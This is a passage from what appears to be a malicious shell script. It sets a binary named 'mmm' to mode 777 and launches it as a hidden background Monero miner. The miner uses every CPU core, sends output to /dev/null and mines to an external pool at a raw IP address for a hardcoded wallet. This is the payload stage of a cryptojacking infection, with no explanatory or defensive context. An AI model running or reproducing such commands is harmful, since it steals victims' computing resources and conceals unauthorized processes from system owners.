...
chmod 777 mmm
./mmm --donate-level 1 -o 147.182.211.160:80 -u 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR -p Sage -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
